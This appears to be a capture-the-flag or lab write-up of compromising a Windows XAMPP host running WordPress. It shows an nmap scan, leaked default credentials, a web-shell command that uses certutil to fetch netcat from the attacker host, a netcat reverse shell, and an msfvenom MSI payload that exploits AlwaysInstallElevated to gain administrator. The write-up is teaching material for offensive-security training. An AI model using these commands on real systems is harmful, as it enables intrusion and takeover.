#### Info Enumeration
```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.205.55/dashboard/
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.205.55/dashboard/
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:wind
```
For SMB, it allows guest to access
```
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357
```

http://192.168.205.55/shenzi/ 
this is a wordpress, some guess here. Like always, edit the template as a reverse shell or cmd.php.


#### foot hold

`http://192.168.205.55/shenzi/wp-content/themes/twentytwenty/index.php?cmd=certutil.exe -urlcache -f http://192.168.45.152/nc64.exe C:\Users\Public\nc.exe`

`C:\Users\Public\nc.exe 192.168.45.152 8821 -e cmd`

#### priv Escalate

run winpeas
```
����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```


https://medium.com/@betigetin/windows-privilege-escalation-via-alwaysinstallelevated-metasploit-manual-858a24aaf3f2


`─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=8822 EXITFUNC=thread -f msi -a x64 -o a.msi  `
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: a.msi
```
transfer payload to target host

`PS C:\xampp\htdocs\shenzi\wp-content\themes\twentytwenty> wget http://192.168.45.152/a.msi -o a.msi`
```
wget http://192.168.45.152/a.msi -o a.msi
```
```
PS C:\xampp\htdocs\shenzi\wp-content\themes\twentytwenty> .\a.msi
.\a.msi
```
get administrator

#### lesson learned
- windows Priv Es AlwaysInstallElevated  set to 1 in HKLM!  set to 1 in HKCU!
